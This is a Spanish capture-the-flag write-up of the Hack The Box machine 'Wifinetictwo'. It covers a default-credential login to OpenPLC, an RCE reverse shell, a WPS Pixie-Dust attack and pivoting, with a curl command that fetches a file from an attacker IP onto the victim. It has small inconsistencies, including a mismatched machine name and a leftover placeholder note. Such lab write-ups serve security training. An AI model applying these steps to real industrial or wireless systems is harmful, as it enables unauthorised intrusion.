--- 
title: "Wifinetictwo" 
platform: "Hackthebox"
date: "2026-02-27" 
difficulty: "Medium" 
os: "linux" 
description: "Resolución de la máquina Analysis de HackTheBox." 
---
#Medium #linux 

-----------
Wifinetictwo es una máquina de dificultad media que destaca por su enfoque en la seguridad de redes industriales y redes inalámbricas. La intrusión comienza con la explotación de un panel de OpenPLC, seguida de un movimiento lateral que requiere la ejecución de ataques WPS Pixie-Dust para obtener acceso a una red Wi-Fi interna y pivotar hacia el sistema host.

1. Fase de Reconocimiento y Enumeración
Iniciamos con el escaneo de puertos y servicios para identificar vectores de entrada:

![[Pasted image 20240318134125.png]]
![[Pasted image 20240318134323.png]]

Identificamos un servicio web corriendo en el puerto 8080 que aloja un panel de OpenPLC. Tras una enumeración básica y pruebas de credenciales por defecto (openplc:openplc), logramos acceso administrativo al dashboard.

![[Pasted image 20240318135713.png]]
![[Pasted image 20240318135743.png]]

2. Explotación: RCE en OpenPLC
Investigamos vulnerabilidades para esta versión de OpenPLC y localizamos un exploit que permite la Ejecución Remota de Comandos (RCE) mediante la subida de un programa malicioso en lenguaje C (estructurado para PLC).

![[Pasted image 20240318152349.png]]

Modificamos el payload para apuntar al recurso que hemos subido en la plataforma y configuramos nuestra IP de atacante:

![[Pasted image 20240318152441.png]]
![[Pasted image 20240318152533.png]]

Al ejecutar el exploit, aunque el script reporte un error visual en la shell, logramos capturar la conexión en nuestro listener de netcat. Tras estabilizar la shell, confirmamos que nos encontramos en un entorno limitado y procedemos a la enumeración de interfaces de red.

![[Pasted image 20240318152611.png]]
![[Pasted image 20240318152654.png]]

3. Movimiento Lateral: Ataque Wireless (Pixie-Dust)
Detectamos que la máquina tiene una interfaz inalámbrica y hay una red Wi-Fi cercana. Al no tener la clave, procedemos a realizar un ataque WPS Pixie-Dust aprovechando debilidades en la generación de números aleatorios del protocolo WPS.

(Nota: Aquí añadirías las capturas del uso de oneshot o bully para obtener el PSK y el BSSID).

Configuración del Suplicante WPA
Con el BSSID y la contraseña obtenida del ataque, creamos un archivo de configuración supplicant.conf para establecer la conexión desde la terminal de la máquina víctima:

![[Pasted image 20240323145528.png]]

Transferimos el archivo al objetivo y levantamos la conexión:

Bash
`curl http://10.10.14.93:8888/supplicant.conf -o ./supplicant.conf`
Bash
`wpa_supplicant -B -i wlan0 -c ./supplicant.conf`
Asignamos una dirección IP estática dentro del rango de la red inalámbrica para poder comunicarnos con el gateway u otros dispositivos:

![[Pasted image 20240323145701.png]]

4. Escalada de Privilegios y Pivoting
Una vez conectados a la red Wi-Fi interna, identificamos un nuevo host en la IP 192.168.1.1. Al realizar una nueva fase de enumeración sobre este objetivo, logramos comprometer el sistema host.

![[Pasted image 20240323145753.png]]
![[Pasted image 20240323145348.png]]

¡Acceso total al sistema conseguido!

Máquina Wifinetictwo comprometida. 🚀
